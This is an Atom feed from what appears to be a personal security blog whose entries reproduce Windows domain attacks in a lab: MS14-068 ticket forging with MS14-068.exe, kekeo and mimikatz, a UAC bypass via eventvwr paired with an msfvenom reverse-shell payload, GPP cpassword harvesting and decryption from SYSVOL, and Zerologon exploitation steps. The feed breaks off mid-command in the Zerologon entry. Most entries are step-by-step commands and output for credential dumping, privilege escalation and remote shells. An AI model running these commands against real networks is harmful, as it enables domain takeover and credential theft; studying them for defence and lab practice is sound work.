<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>J3fffff&#39;s Blog</title>
  
  
  <link href="https://j3f5.github.io/atom.xml" rel="self"/>
  
  <link href="https://j3f5.github.io/"/>
  <updated>2023-08-14T07:55:16.000Z</updated>
  <id>https://j3f5.github.io/</id>
  
  <author>
    <name>Jeff</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>NTLM-relay复现</title>
    <link href="https://j3f5.github.io/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/08/14/NTLM-relay%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-08-14T07:55:16.000Z</published>
    <updated>2023-08-14T07:55:16.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>relay复现</title>
    <link href="https://j3f5.github.io/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/08/14/relay%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-08-14T07:55:03.000Z</published>
    <updated>2023-08-14T07:55:03.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>PTT与MS14-068</title>
    <link href="https://j3f5.github.io/articles/2023/08/14/PTT%E4%B8%8EMS14-068/"/>
    <id>https://j3f5.github.io/articles/2023/08/14/PTT%E4%B8%8EMS14-068/</id>
    <published>2023-08-14T07:09:17.000Z</published>
    <updated>2023-08-14T07:09:17.000Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>MS14-068复现</title>
    <link href="https://j3f5.github.io/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/08/14/MS14-068%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-08-14T06:10:12.000Z</published>
    <updated>2023-08-14T06:10:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><p>该漏洞是用于获取域控权限的方法之一，其工作原理是：</p><blockquote><p>Kerberos 域用户提权漏洞（MS14-068，CVE-2014-6324），所有 Windows <a href="https://cloud.tencent.com/product/cvm?from_column=20421&amp;from=20421">服务器</a>都会收到该漏洞影响。包括 Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2。</p><p>该漏洞可导致活动目录整体权限控制收到影响，<strong>允许攻击者将域内任意用户权限提升至域管理级别</strong>。</p><p>漏洞产生原理：用户在向 Kerberos 密钥分发中心（KDC）申请TGT（由票据授权服务产生的身份凭证）时，可以伪造自己的 Kerberos 票据。如果票据声明自己有域管理员权限，而KDC在处理该票据时未验证票据的签名，那么，返给用户的TGT就使普通域用户拥有了域管理员权限。该用户可以将TGT发送到KDC，KDC的TGS（票据授权服务）在验证了TGT后，将服务票据（Server Ticket）发送给该用户，而该用户拥有访问该服务的权限，从而使攻击者可以访问域内的资源。</p></blockquote><p>条件是：</p><ol><li>没有补丁：KB3011780</li><li>有域用户权限</li><li>有sid</li></ol><p>可以利用的方法有：</p><ol><li>清空凭证</li><li>mimikatz / kekeo …方法将域控凭证导入到本地凭证中</li><li>通过Pass the ticket来获取域控权限</li></ol><p>参考：</p><ol><li>原理：<a href="https://www.cnblogs.com/feizianquan/p/11760564.html">https://www.cnblogs.com/feizianquan/p/11760564.html</a></li></ol><h1 id="方法一"><a class="markdownIt-Anchor" href="#方法一"></a> 方法一</h1><p><a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p><p><a href="https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe">https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</a></p><ol><li><p>获取sid / 用户名 / 域名 / 域控ip信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;whoami /user</span><br><span class="line">用户名            SID</span><br><span class="line">================= ==============================================</span><br><span class="line">whoamianony\bunny S-1-5-21-1315137663-3706837544-1429009142-1112</span><br><span class="line"></span><br><span class="line">&gt;systeminfo</span><br><span class="line">域：whoaminony.org</span><br><span class="line"></span><br><span class="line">&gt;nslookup -type=SRV _ldap.tcp</span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  192.168.93.30（域控IP）</span><br><span class="line"></span><br><span class="line">&gt;nltest /DCLIST:whoamianony</span><br><span class="line">获得域“whoamianony”中 DC 的列表(从“\\DC”中)。</span><br><span class="line">无法 DsBind 到 whoamianony (\\DC)。Status = 2148074274 0x80090322 SEC_E_WRONG_PR</span><br><span class="line">INCIPAL</span><br><span class="line">域 whoamianony 中的 DC 列表</span><br><span class="line">    \\DC (PDC)（域控名）</span><br></pre></td></tr></table></figure></li><li><p>本地提权+获取密码+清空凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;./mimikatz.exe </span><br><span class="line">&gt;privilege::debug</span><br><span class="line">&gt;sekurlsa::logonpasswords</span><br><span class="line">        kerberos :</span><br><span class="line">         * Username : bunny</span><br><span class="line">         * Domain   : WHOAMIANONY.ORG</span><br><span class="line">         * Password : Bunny2021</span><br><span class="line">&gt;kerberos::list //查看当前机器凭证</span><br><span class="line">&gt;kerberos::purge//清空当前机器中所有凭证</span><br><span class="line">&gt;exit</span><br></pre></td></tr></table></figure></li><li><p>制作金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u &lt;userName&gt;@&lt;domainName&gt; -s &lt;userSid&gt; -d &lt;domainControlerAddr&gt;</span><br><span class="line">OPTIONS:</span><br><span class="line">    -p &lt;clearPassword&gt;</span><br><span class="line"> --rc4 &lt;ntlmHash&gt;</span><br><span class="line"></span><br><span class="line">&gt;MS14-068.exe -u bunny@whoamianony.org -s S-1-5-21-1315137663-3706837544-1429009142-1112 -d 192.168.93.30 -p Bunny2021</span><br><span class="line">[+] Creating ccache file &#x27;TGT_bunny@whoamianony.org.ccache&#x27;... Done!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 其他工具</span><br><span class="line"># goldenPac.py</span><br><span class="line">python3 goldenPac.py zjun.com/user1:P@ssw0rd@P-DC.zjun.com -dc-ip 172.16.86.136 -target-ip 172.16.86.136 -debug</span><br><span class="line"></span><br><span class="line"># goldenPac.exe</span><br><span class="line">goldenPac.exe zjun.com/user1:P@ssw0rd@P-DC.zjun.com</span><br><span class="line"></span><br><span class="line"># msf</span><br><span class="line">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line"></span><br><span class="line"># kekeo</span><br><span class="line">exploit::ms14068 /domain:zjun.com /user:user1 /password:P@ssw0rd /sid:S-1-5-21-2335421620-514153290-2844484534-1125 /ptt</span><br><span class="line"></span><br><span class="line"># mimikatz</span><br><span class="line">kerberos::golden /krbtgt: /admin:域管理 /domain:域名 /sid:sid /ticket:gold.kirbi</span><br></pre></td></tr></table></figure></li><li><p>注入票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;mimikatz.exe </span><br><span class="line">&gt;kerberos::ptc TGT_bunny@whoamianony.org.ccache</span><br><span class="line">&gt;exit</span><br></pre></td></tr></table></figure><p><img src="/images/MS14-068%E5%A4%8D%E7%8E%B0/image-20230814150425972.png" alt="image-20230814150425972" /></p><p><img src="/images/MS14-068%E5%A4%8D%E7%8E%B0/image-20230814150638986.png" alt="image-20230814150638986" /></p></li><li><p>写入成功后，通过ptt连接域控：</p><p><img src="/images/MS14-068%E5%A4%8D%E7%8E%B0/image-20230727161341392.png" alt="image-20230727161341392" /></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#简介&quot;&gt;&lt;/a&gt; 简介&lt;/h1&gt;
&lt;p&gt;该漏洞是用于获取域控权限的方法之一，其工作原理是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kerberos 域用户提权漏洞（MS14-068，</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BypassUAC提权</title>
    <link href="https://j3f5.github.io/articles/2023/08/11/BypassUAC%E6%8F%90%E6%9D%83/"/>
    <id>https://j3f5.github.io/articles/2023/08/11/BypassUAC%E6%8F%90%E6%9D%83/</id>
    <published>2023-08-11T01:13:32.000Z</published>
    <updated>2023-08-11T01:13:32.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h1><p>英文名：User Account Control。他有几个档位，中级/高级/默认等等。一旦设置了，那么执行需要管理员权限的操作时，就会弹窗确认。这时候，我们的一些软件，例如Mimikatz就用不了了，所以需要Bypass，达到<code>High Mandatory Level</code>即可。可以手工，也可以使用MSF（里面好多payload）。</p><p>通常，我们可以使用eventvwr.exe程序绕过，该程序允许普通用户以管理员权限运行eventvwr.exe，而无需提供管理员凭据（用于查看系统的事件日志，这也是正常的行为）。该漏洞已经被新版本的Windows修复啦。</p><img src="/images/BypassUAC%E6%8F%90%E6%9D%83/image-20230731164100532.png" alt="image-20230731164100532" style="zoom: 33%;" /><p>UAC有四种设置要求：</p><ol><li>始终通知</li><li>仅在程序试图更改我的计算机时通知我</li><li>仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）</li><li>从不提示</li></ol><img src="/images/BypassUAC%E6%8F%90%E6%9D%83/image-20230731164019438.png" alt="image-20230731164019438" style="zoom:70%;" /><h1 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h1><h2 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h2><p>大概路线：</p><ol><li>创建一个伪装的eventvwr.exe程序，并将其存储在受攻击者控制的目录下，通常是用户目录或可写的临时目录。</li><li>在注册表中创建一个伪装的eventvwr.exe应用程序路径键值，将它指向伪装的eventvwr.exe路径。</li><li>触发eventvwr.exe运行，由于Windows默认会在PATH中查找可执行文件，因此系统将使用注册表中伪装的路径启动eventvwr.exe。</li><li>由于eventvwr.exe是允许以管理员权限运行的程序，因此伪装的eventvwr.exe也会以管理员权限运行，从而绕过了UAC提示。</li><li>通常，配合反弹shell，完成提权</li></ol><p>使用<code>whoami /all</code>查看权限，看是否在管理员用户组中，如果在，并且不是High Mandatory Level，那么就<strong>可能</strong>需要进行Bypass了。</p><p><img src="/images/BypassUAC%E6%8F%90%E6%9D%83/172605390-b7dfb995-c707-45cd-be78-9c7d2f23c4a5.png" alt="OnPaste 20220608-165652" /></p><p>进一步确认是否存在UAC，执行以下命令，如果EnableLUA为0则不需要Bypass，如果为1且<code>PromptSecureDesktop</code>也为1，则可以进行Bypass。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System </span><br></pre></td></tr></table></figure><p>查看是否存在eventvwr程序，并且查看是否存在提权条件（<a href="https://github.com/k4sth4/UAC-bypass/blob/main/strings64.exe">string64.exe</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">where /r C:\\windows eventvwr.exe</span><br><span class="line">strings64.exe -accepteula C:\\Windows\\System32\\eventvwr.exe | findstr /i autoelevate</span><br></pre></td></tr></table></figure><p>如果存在，则编译exploit，这个程序可以伪造注册表，到我们指定的目录：<a href="https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c%E3%80%82%E4%B8%8A%E4%BC%A0%E8%AF%A5%E8%84%9A%E6%9C%AC%E7%9A%84exe%EF%BC%8C%E8%BF%98%E6%9C%89%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AAshell.exe%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%87%8C%EF%BC%8C%E8%BF%90%E8%A1%8Cexploit%E5%8D%B3%E5%8F%AF%E3%80%82">https://github.com/k4sth4/UAC-bypass/blob/main/eventvwr-bypassuac.c。上传该脚本的exe，还有生成一个shell.exe到服务器里，运行exploit即可。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p>当得到High之后，我们可以使用<a href="https://github.com/k4sth4/UAC-bypass/blob/main/psexec64.exe">psexec64</a>提权，接收返回的shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\psexec64.exe -i -accepteula -d -s C:\\programdata\\shell.exe</span><br></pre></td></tr></table></figure><h2 id="msf"><a class="markdownIt-Anchor" href="#msf"></a> MSF</h2><p>MSF里面有很多工具，我觉得还是得看上面的条件才去使用payload。bypassuac注意需要用户在管理员组，并且uac是开启状态，uac如果是关闭状态是可以直接getsystem进行提权的。</p><p>win7(这个高级用不了，去其他的把）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure><p>win10：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/ask</span><br><span class="line">use exploit/windows/local/bypassuac_sluihijack</span><br><span class="line">use exploit/windows/local/bypassuac_silentcleanup</span><br></pre></td></tr></table></figure><h2 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h2><p>工具：uacme</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;背景&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#背景&quot;&gt;&lt;/a&gt; 背景&lt;/h1&gt;
&lt;p&gt;英文名：User Account Control。他有几个档位，中级/高级/默认等等。一旦设置了，那么执行需要管理员权限的操作时，就会弹窗确认。</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>SYSVOL、GPP和MS14-025复现</title>
    <link href="https://j3f5.github.io/articles/2023/08/10/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/08/10/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-08-10T06:46:56.000Z</published>
    <updated>2023-08-10T06:46:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="相关背景"><a class="markdownIt-Anchor" href="#相关背景"></a> 相关背景</h1><p>组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。</p><h2 id="攻击面"><a class="markdownIt-Anchor" href="#攻击面"></a> 攻击面</h2><ol><li>SYSVOL会有脚本和密码泄露，需要使用官网给出的密钥解密。<a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></li><li>组策略提权</li></ol><h2 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h2><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">3gstudent的文章</a></p><h1 id="设置"><a class="markdownIt-Anchor" href="#设置"></a> 设置</h1><p>参考：<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">3gstudent</a>，我这里是2012</p><img src="/images/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/image-20230810145341841.png" alt="image-20230810145341841" style="zoom: 33%;" /><img src="/images/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/image-20230810145534346.png" alt="image-20230810145534346" style="zoom:33%;" /><img src="/images/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/image-20230810145708373.png" alt="image-20230810145708373" style="zoom:33%;" /><p>查询到：</p><img src="/images/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/image-20230810150202752.png" alt="image-20230810150202752" style="zoom:33%;" /><h1 id="攻击"><a class="markdownIt-Anchor" href="#攻击"></a> 攻击</h1><h2 id="获取组策略登录的明文密码并解密手工"><a class="markdownIt-Anchor" href="#获取组策略登录的明文密码并解密手工"></a> 获取组策略登录的明文密码并解密（手工）</h2><p>在域内主机，可以查询到如图信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查看是否存在此文件（手动一个个找）</span><br><span class="line">dir \\192.168.93.30\SYSVOL\whoamianony.org\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\Groups.xml</span><br><span class="line"></span><br><span class="line"># 将文件下载到本地</span><br><span class="line">copy \\192.168.93.30\SYSVOL\whoamianony.org\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\USER\Preferences\Groups\Groups.xml</span><br><span class="line"></span><br><span class="line"># 读取密码</span><br><span class="line">type Groups.xml</span><br></pre></td></tr></table></figure><p>或者，可以快速查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># findstr /s /I cpassword \\域控机器名\SYSVOL\域名\policies*.xml</span><br></pre></td></tr></table></figure><img src="/images/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/image-20230810154640589.png" alt="image-20230810154640589" style="zoom: 50%;" /><p>明文密码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UER8X5IxCSQytJ++Pw2GHgQzPa+PAg9WuVRhi5VZ5xs</span><br></pre></td></tr></table></figure><p><img src="/images/SYSVOL%E3%80%81GPP%E5%92%8CMS14-025%E5%A4%8D%E7%8E%B0/image-20230814114310546.png" alt="image-20230814114310546" /></p><p>使用kali解密：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(j3fffff㉿j3fffff)-[~]</span><br><span class="line">└─$ gpp-decrypt UER8X5IxCSQytJ++Pw2GHgQzPa+PAg9WuVRhi5VZ5xs</span><br><span class="line">Whoami2021</span><br></pre></td></tr></table></figure><h2 id="使用msf模块"><a class="markdownIt-Anchor" href="#使用msf模块"></a> 使用msf模块</h2><p>有两个模块：</p><ol><li></li></ol><h2 id="使用powershell-powersploit"><a class="markdownIt-Anchor" href="#使用powershell-powersploit"></a> 使用powershell-powersploit</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;相关背景&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#相关背景&quot;&gt;&lt;/a&gt; 相关背景&lt;/h1&gt;
&lt;p&gt;组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, G</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>zeroLogon漏洞复现</title>
    <link href="https://j3f5.github.io/articles/2023/08/10/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://j3f5.github.io/articles/2023/08/10/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2023-08-10T01:41:27.000Z</published>
    <updated>2023-08-10T01:41:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="zerologon-cve-2020-1472简介"><a class="markdownIt-Anchor" href="#zerologon-cve-2020-1472简介"></a> ZeroLogon (CVE-2020-1472)简介</h1><p>Netlogon远程协议（也称为MS-NRPC）是一个WIndows域控上使用的远程进程调用（RPC）接口，仅由连接到域的设备使用。  MS-NRPC包括身份验证方法和建立Netlogon安全通道的方法。这些更新强制指定的Netlogon客户端行为，以便在成员计算机和Active Directory (AD)域控制器(DC)之间使用带有Netlogon安全通道的安全RPC。最常用于让用户使用 NTLM  协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。</p><p>ZeroLogon (CVE-2020-1472) 影响<strong>域内登录认证协议Netlogon (MS-NRPC) 中所使用的加密身份验证方案  (AES-CFB8)</strong>，在通过NetLogon协议与AD域控建立安全通道（RPC）时，强行登录尝试，<strong>对全零的纯文本应用AES-CFB8加密将导致全零的密文，从而可以绕过正常认证，进一步可获取域管理员HASH，获取域管权限</strong> 。</p><p>AES-CFB8的工作原理是，通过在明文前面添加一个16字节的初始化矢量（IV），然后将AES应用于IV和明文的前16个字节，并采用AES输出的第一个字节，来加密明文的每个字节，然后将其与下一个纯文本字节进行异或。</p><p>利用身份验证协议的方法是强行登录尝试。对于256个密钥中的1个，对全零的纯文本应用AESCFB8加密将导致全零的密文，从而启用登录绕过，这就是名称zerologon的来源。</p><p>使用NetrServerPasswordSet2方法，可以为客户端创建一个新密码，该密码可以使用AES-CFB8用会话密钥进行加密。  Netlogon纯文本密码由516个字节组成，后四个表示密码长度。通过提供516个零，它将被解密为516个零或一个空密码。以这种方式更改密码只能在AD中进行更新。</p><p>[<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">MS-NRPC]： 网络服务器密码集 2 （运营 30） |微软文档 (microsoft.com)</a></p><p>大部分漏洞利用代码的工作原理是，向netlogon通道发送带有多个空字节的身份验证请求，然后发送一个零的密码文本和用于身份验证的质询标志</p><p>参考：</p><ol><li><a href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">链接</a></li><li><a href="https://cloud.tencent.com/developer/article/1727748">有流量分析</a></li></ol><h1 id="影响版本"><a class="markdownIt-Anchor" href="#影响版本"></a> 影响版本</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure><h1 id="利用条件"><a class="markdownIt-Anchor" href="#利用条件"></a> 利用条件</h1><p>攻击者只需要定位域控主机名及IP，并且可以访问域控，就可以在无需任何凭据的情况下拿到域管理员的权限，甚至不需要在域内。</p><h1 id="相关事项注意"><a class="markdownIt-Anchor" href="#相关事项注意"></a> 相关事项注意</h1><p><strong>域控的机器帐户HASH存储在注册表中，系统启动时会将其加载到lsass，当攻击置空域控HASH后，仅AD (NTDS.DIT)  中的密码会更改，而不是注册表或加载到lsass中的密码，域控存储在域中的凭证与本地的注册表/lsass中的凭证不一致时，这样将会导致域控脱域，无法使用Kerberos进行身份验证，因此要尽快恢复。</strong></p><h1 id="步骤"><a class="markdownIt-Anchor" href="#步骤"></a> 步骤</h1><ol><li>获取域内信息，netbios名，定位域控IP</li><li>检测是否存在漏洞</li><li>将AD域控的机器账户DC的密码置换成空</li><li>此时域控服务器账户密码为空，同等于已知密码，可以导出域内所有用户凭据</li><li>导出hash后，发现DC的hash为31d6cfe0d16ae931b73c59d7e0c089c0，也就是空密码，同时获得了域管administrator的hash，利用administrator的hash拿下域控</li><li>恢复凭证</li></ol><h2 id="获取netbios名"><a class="markdownIt-Anchor" href="#获取netbios名"></a> 获取NetBios名</h2><ol><li><p>使用nmap：这里面没办法通，因为我没有弄UDP隧道</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo proxychains nmap -sU --script nbstat.nse -p137 192.168.93.0/24 -T4</span><br></pre></td></tr></table></figure></li><li><p>使用nbtscan：这也一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nbtscan -r 192.168.93.1/24</span><br></pre></td></tr></table></figure><p>项目地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a> <a href="https://github.com/charlesroelli/nbtscan">https://github.com/charlesroelli/nbtscan</a></p></li><li><p>使用msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/netbios/nbname</span><br><span class="line"></span><br><span class="line"># result</span><br><span class="line">[*] Sending NetBIOS requests to 192.168.93.1-&gt;192.168.93.50 (50 hosts)</span><br><span class="line">[+] 192.168.93.20 [PC1] OS:Windows Names:(PC1, WHOAMIANONY, __MSBROWSE__)  Mac:00:0c:29:f9:56:c0 Virtual Machine:VMWare</span><br><span class="line">[+] 192.168.93.30 [DC] OS:Windows Names:(DC, WHOAMIANONY) Addresses:(192.168.93.30) Mac:00:0c:29:11:77:96 Virtual Machine:VMWare</span><br></pre></td></tr></table></figure></li></ol><h2 id="测试是否可以使用该漏洞"><a class="markdownIt-Anchor" href="#测试是否可以使用该漏洞"></a> 测试是否可以使用该漏洞</h2><h3 id="脚本impacket"><a class="markdownIt-Anchor" href="#脚本impacket"></a> 脚本（impacket）</h3><p>脚本：<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">proxychains python zerologon_tester.py DC 192.168.93.30</span><br><span class="line"># result</span><br><span class="line">Success! DC can be fully compromised by a Zerologon attack.</span><br></pre></td></tr></table></figure><h3 id="mimikatz"><a class="markdownIt-Anchor" href="#mimikatz"></a> mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon /target:dc.whoamianony.org /account:dc$</span><br></pre></td></tr></table></figure><img src="/images/zeroLogon%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230810110236045.png" alt="image-20230810110236045" style="zoom:50%;" /><h2 id="置空域控hash"><a class="markdownIt-Anchor" href="#置空域控hash"></a> 置空域控HASH</h2><h3 id="脚本"><a class="markdownIt-Anchor" href="#脚本"></a> 脚本</h3><p>工具 <a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python set_empty_pw.py DC 